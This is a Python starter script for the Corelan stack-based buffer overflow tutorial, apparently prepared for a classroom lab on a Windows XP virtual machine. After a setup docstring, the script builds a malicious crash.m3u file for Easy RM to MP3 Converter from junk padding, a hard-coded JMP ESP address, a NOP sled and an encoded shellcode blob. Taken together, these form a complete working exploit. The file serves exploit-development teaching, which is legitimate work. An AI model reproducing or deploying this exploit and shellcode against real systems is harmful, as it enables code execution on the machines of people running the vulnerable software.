#!C:\python27\python.exe

'''
This is a starting file for the Corelan Exploit tutorial which can be found here:
https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

Steps to get started:
1) Create a Windows XP VM (obtain VMware license as necessary)
	a) key in windows_xp.txt
	b) do install vmware tools
2) Install software
	a) python-2.7.4 -- make sure to add this to the path for simplicity
	b) notepad++ 6.6 (if you want it -- I use it for the tutorial)
	c) immunity debugger 1.85
	4) mona (see readme for instructions)
	e) EasyRMtoMP3Converter -- you'll want to unzip this hostside, then copy it over
C) Copy the exploit_start.py script (this file) to your VM
4) TAKE A SNAPSHOT OF YOUR VM. Trust me on this, life will be better if you do.
	a) it is faster to do this if your VM is powered down, but it will work either way.
	2) if you do snapshot with it on, do be kind, and leave it alone while it's doing its work.

Some notes:
[]The tutorial uses windbg + metasploit + perl
[]We will use immunity + mona + python
[]We are running this on an old XP VM.
[]The versions of python and notepad++ are the latest that run on such an old platform
[]If you don't know how to edit the system path, just ask when we get started. Likely you're not alone.
'''


import struct

def main():

	out = open('crash.m3u','w')
#26067
#26067 *****
#26060 too few
#26070 too many	
#26090 too many
#26080 failed
#26075 failed
#26072 passed
#26073 fail# Create a file and call it crash.m3u
	junk = 'A' * 26067				# Overflow with junk
	eip = struct.pack('<I', 0x01A8F23A)		# Found a jmp esp instruction:  01A8F23A   FFE4		JMP ESP
	NOP = "\x90" * 25				# NOPs

	shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"

	write_string = junk + eip + NOP + shellcode	# Concatenate to one string
	out.write(write_string)				# Write out to the file
	out.close()					# Close said file


if __name__ == '__main__':
	main()